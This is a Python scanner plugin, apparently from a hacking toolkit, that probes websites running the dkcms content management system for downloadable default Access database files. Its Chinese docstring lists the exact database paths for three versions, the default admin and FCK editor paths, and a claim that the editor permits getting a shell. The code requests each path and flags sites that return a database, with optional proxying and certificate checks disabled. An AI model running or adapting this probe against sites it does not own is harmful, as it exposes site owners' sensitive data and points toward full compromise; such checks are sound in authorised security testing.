#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 动科(dkcms)默认数据库漏洞
referer: http://www.myhack58.com/Article/html/3/62/2013/36692.htm
author: Lucifer
description: dkcms存在默认数据库,可下载查看敏感数据,FCK编辑器可GETSHELL。
            V2.0   data/dkcm_ssdfhwejkfs.mdb
            V3.1   _data/___dkcms_30_free.mdb
            V4.2   _data/I^(()UU()H.mdb
            默认后台：admin
            编辑器：admin/fckeditor
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


payloads = ["/data/dkcm_ssdfhwejkfs.mdb",
            "/_data/___dkcms_30_free.mdb",
            "/_data/I^(()UU()H.mdb"]
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        for payload in payloads:
            payload_url = scheme+"://"+url+payload
            headers = {
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'User-Agent': RandomAgent,
            }
            #s = requests.session()
            if ProxyIp!=None:
                proxies = {
                    # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                    "http": "http://" + str(ProxyIp)
                }
                resp = requests.head(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            elif ProxyIp==None:
                resp = requests.head(payload_url,headers=headers, timeout=5, verify=False)
            con = resp.text
            code = resp.status_code
            if resp.headers["Content-Type"] == "application/x-msaccess":
                Medusa = "{} 存在dkcms默认数据库漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                return (Medusa)
    except Exception as e:
        pass